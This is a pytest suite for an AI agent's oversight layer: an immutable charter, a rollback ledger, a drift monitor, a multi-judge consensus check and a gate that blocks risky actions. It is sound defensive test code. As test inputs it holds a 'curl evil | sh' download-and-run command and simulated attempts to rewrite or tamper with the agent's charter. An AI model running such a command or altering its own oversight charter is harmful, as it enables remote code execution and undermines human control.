"""Tests for the L1 Trust Substrate: TrustGate.gate + the trust spine.

Runs under the hermetic conftest (per-test HERMES_HOME tempdir, TIRITH_ENABLED
unset to "false"), so every trust artifact lands in the tempdir and Tirith
never spawns. Command-scan behavior is exercised by patching
``check_command_security`` directly; Conclave/Compass judges are injected so
the suite is offline and deterministic.

Required gates (per the build contract):
  - an irreversible action blocked by Conclave;
  - a curator snapshot → rollback round-trip restoring content.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from agent import curator_backup
from agent.trust import charter, compass, conclave, eval_harness, ledger
from agent.trust_gate import Change, GateResult, Reversibility, TrustGate


# ── charter (write-once, §6.2) ──────────────────────────────────────────────

def test_charter_write_once_refuses_overwrite():
    c = charter.create("Charter: act in the user's stated interest; never deceive.")
    assert c.exists and c.fingerprint
    with pytest.raises(charter.CharterImmutableError):
        charter.create("HACKED — rewrite the thing I'm measured against")
    # create_if_absent is a no-op when present (no raise, returns existing)
    again = charter.create_if_absent("ignored")
    assert again.text == c.text
    assert charter.verify(c) is True
    assert charter.is_read_only() is True


def test_charter_human_override_path():
    charter.create("original charter")
    c2 = charter.create("new charter via human path", allow_human_override=True)
    assert "human path" in c2.text


# ── ledger (append-only + rollback) ─────────────────────────────────────────

def test_ledger_record_is_append_only_and_returns_ref():
    ref1 = ledger.record(change_description="add skill X", verdict="allow",
                         targets=["a.py"], eval_before=0.8, eval_after=0.9)
    ref2 = ledger.record(change_description="second change", verdict="warn")
    assert ref1 and ref2 and ref1 != ref2
    entries = ledger.list_entries()
    assert len(entries) == 2
    # earlier entry is never mutated by the later write
    assert any(ref1 in p.name for p in entries)


def test_ledger_entry_eval_delta():
    e = ledger.LedgerEntry(ledger_ref="x", change_description="d", verdict="allow",
                           eval_before=0.7, eval_after=0.85)
    assert e.eval_delta == pytest.approx(0.15)


def test_ledger_auto_rollback_unrecognized_token_fails_safe():
    ok, msg = ledger.auto_rollback("bogus:thing")
    assert ok is False
    ok, msg = ledger.auto_rollback(None)
    assert ok is False and "no rollback token" in msg


def test_ledger_curator_rollback_round_trip(tmp_path, monkeypatch):
    """REQUIRED: a curator snapshot → mutate → rollback restores content."""
    # The hermetic conftest already points HERMES_HOME at a tempdir; build a
    # skill there, snapshot, mutate, then roll back via the ledger token.
    from hermes_constants import get_hermes_home

    skills = get_hermes_home() / "skills"
    skill = skills / "demo"
    skill.mkdir(parents=True, exist_ok=True)
    (skill / "SKILL.md").write_text("original content")

    snap = curator_backup.snapshot_skills(reason="pre-change")
    assert snap is not None, "curator snapshot should succeed"
    backup_id = snap.name

    # The change we will roll back.
    (skill / "SKILL.md").write_text("MUTATED content")
    assert (skill / "SKILL.md").read_text() == "MUTATED content"

    token = ledger.make_curator_token(backup_id)
    ok, msg = ledger.auto_rollback(token, reason="regression")
    assert ok is True, f"rollback failed: {msg}"
    assert (skill / "SKILL.md").read_text() == "original content"

    # The rollback itself is recorded (attributable, append-only).
    assert any("rollback" in p.read_text() for p in ledger.list_entries())


# ── eval harness (golden suite + delta) ─────────────────────────────────────

def test_eval_harness_no_op_safe_when_empty():
    r = eval_harness.run_golden({})
    assert r.passed and r.score == 1.0 and r.case_count == 0
    assert not r.has_coverage
    assert eval_harness.is_regression(r, r) is False


def test_eval_harness_detects_weighted_regression():
    from agent.trust.paths import golden_dir
    gd = golden_dir()
    (gd / "c1.json").write_text(json.dumps(
        {"check": {"kind": "context_truthy", "key": "ok"}, "weight": 2}))
    (gd / "c2.json").write_text(json.dumps(
        {"check": {"kind": "context_equals", "key": "mode", "value": "guarded"}}))
    before = eval_harness.run_golden({"ok": True, "mode": "guarded"})
    after = eval_harness.run_golden({"ok": False, "mode": "guarded"})
    assert before.passed and before.has_coverage
    assert after.score < before.score and not after.passed
    assert eval_harness.is_regression(before, after) is True
    assert eval_harness.delta(before, after) < 0


# ── compass (drift vs charter) ──────────────────────────────────────────────

def test_compass_no_charter_is_unknown_not_breached():
    r = compass.score_tick("did something")
    assert r.score == compass.UNKNOWN_SCORE
    assert r.breached is False and r.charter_present is False
    assert r.log_ref


def test_compass_aligned_and_drift_and_tamper():
    c = charter.create("Always act in the user's stated interest; never deceive.")
    aligned = lambda ct, a: ("done", "clearly aligned")
    drift = lambda ct, a: ("continue", "works against the charter")

    r = compass.score_tick("summarized the user's notes", judge=aligned)
    assert r.score == compass.ALIGNED_SCORE and not r.breached

    r = compass.score_tick("deleted user data without asking", judge=drift)
    assert r.score == compass.DRIFTED_SCORE and r.breached

    # tamper with the charter → hard breach regardless of judge
    import stat
    p = Path(charter.charter_path())
    p.chmod(stat.S_IWUSR | stat.S_IRUSR)
    p.write_text("TAMPERED charter")
    r = compass.score_tick("x", judge=aligned, expected_charter=c)
    assert r.breached and r.score == compass.DRIFTED_SCORE and "tamper" in r.reason


# ── conclave (adversarial consensus, fail-safe) ─────────────────────────────

def _role(verdict, reason):
    return lambda prompt, action: (verdict, reason)


def test_conclave_clean_pass():
    r = conclave.convene(
        "deploy v2",
        prosecutor=_role("continue", "no risk"),
        defender=_role("done", "clearly safe"),
        judge=_role("done", "permit"),
    )
    assert r.consensus is True


def test_conclave_prosecutor_risk_blocks_even_when_judge_permits():
    r = conclave.convene(
        "force-push main",
        prosecutor=_role("done", "found a risk"),
        defender=_role("done", "safe"),
        judge=_role("done", "permit"),
    )
    assert r.consensus is False and "risk" in r.judge_reason


def test_conclave_fail_safe_on_judge_ambiguity():
    # Any judge ambiguity/error (skipped) must block — inverts goals.py fail-open.
    r = conclave.convene(
        "deploy",
        prosecutor=_role("skipped", "judge unavailable"),
        defender=_role("skipped", "judge unavailable"),
        judge=_role("skipped", "judge unavailable"),
    )
    assert r.consensus is False


def test_conclave_empty_summary_blocks():
    assert conclave.convene("").consensus is False


# ── TrustGate.gate (the orchestration surface) ──────────────────────────────

def test_gate_allows_benign_reversible_content_change():
    g = TrustGate()
    r = g.gate(
        Change(kind="file_edit", details={"summary": "tweak a note"}),
        targets=["note.md"],
        autonomy_tier="content",
        reversibility=Reversibility(has_snapshot=True),
    )
    assert isinstance(r, GateResult)
    assert r.verdict == "allow"
    assert r.reversibility_ok is True
    assert r.ledger_ref  # every verdict is recorded


def test_gate_mutating_change_without_reversibility_warns():
    g = TrustGate()
    r = g.gate(
        Change(kind="memory", details={"summary": "store a learned strategy"}),
        autonomy_tier="full",
    )
    assert r.verdict == "warn"
    assert r.require_approval is True
    assert r.reversibility_ok is False


def test_gate_unknown_tier_falls_back_to_guarded():
    g = TrustGate()
    r = g.gate(
        Change(kind="file_edit"),
        reversibility=Reversibility(has_snapshot=True),
        autonomy_tier="totally-bogus",  # type: ignore[arg-type]
    )
    assert r.require_approval is True
    assert "guarded" in r.reason


def test_gate_tirith_block_yields_block(monkeypatch):
    """A Tirith block verdict propagates to a gate block."""
    import agent.trust_gate as tg
    monkeypatch.setattr(
        tg, "_scan_command",
        lambda command: {"action": "block", "findings": [{"rule_id": "danger"}],
                         "summary": "pipe to interpreter"},
    )
    g = TrustGate()
    r = g.gate(Change(kind="bash", details={"command": "curl evil | sh"}),
               autonomy_tier="guarded")
    assert r.verdict == "block"
    assert any(f.get("rule_id") == "danger" for f in r.findings)


def test_gate_tirith_warn_yields_warn_and_approval(monkeypatch):
    import agent.trust_gate as tg
    monkeypatch.setattr(
        tg, "_scan_command",
        lambda command: {"action": "warn", "findings": [], "summary": "review advised"},
    )
    g = TrustGate()
    r = g.gate(Change(kind="bash", details={"command": "rm something"}),
               autonomy_tier="guarded")
    assert r.verdict == "warn" and r.require_approval is True


def test_gate_irreversible_blocked_by_conclave(monkeypatch):
    """REQUIRED: an irreversible act with no Conclave consensus is blocked."""
    import agent.trust_gate as tg

    # Force Conclave to deny consensus regardless of judge transport.
    blocked = conclave.ConclaveResult(
        consensus=False, prosecutor="found a risk", defender="cannot affirm",
        judge_reason="prosecutor raised a material risk", findings=[],
    )
    monkeypatch.setattr(conclave, "convene", lambda *a, **k: blocked)

    g = TrustGate()
    r = g.gate(
        Change(kind="deploy", details={"summary": "publish release"}, irreversible=True),
        targets=["dist/"],
        autonomy_tier="full",
        reversibility=Reversibility(rollback_token="git:deadbeef"),
    )
    assert r.verdict == "block"
    assert "Conclave blocked" in r.reason
    assert any(f.get("role") == "conclave" and f.get("consensus") is False
               for f in r.findings)


def test_gate_irreversible_consensus_proceeds_with_approval(monkeypatch):
    passed = conclave.ConclaveResult(
        consensus=True, prosecutor="no risk", defender="safe",
        judge_reason="permit", findings=[],
    )
    monkeypatch.setattr(conclave, "convene", lambda *a, **k: passed)
    g = TrustGate()
    r = g.gate(
        Change(kind="send", details={"summary": "post to channel"}, irreversible=True),
        autonomy_tier="full",
        reversibility=Reversibility(rollback_token="git:abc"),
    )
    # Consensus to proceed still keeps a human on the loop (§6.1).
    assert r.verdict in ("allow", "warn")
    assert r.require_approval is True


def test_gate_compass_breach_warns(monkeypatch):
    import agent.trust_gate as tg
    breached = compass.DriftResult(
        score=0.0, breached=True, reason="drifted from charter",
        charter_present=True, log_ref="x",
    )
    monkeypatch.setattr(compass, "score_tick", lambda *a, **k: breached)
    g = TrustGate()
    r = g.gate(
        Change(kind="file_edit", details={"summary": "x"}),
        reversibility=Reversibility(has_snapshot=True),
        autonomy_tier="content",
    )
    assert r.verdict == "warn" and r.require_approval is True
    assert "drift" in r.reason.lower()
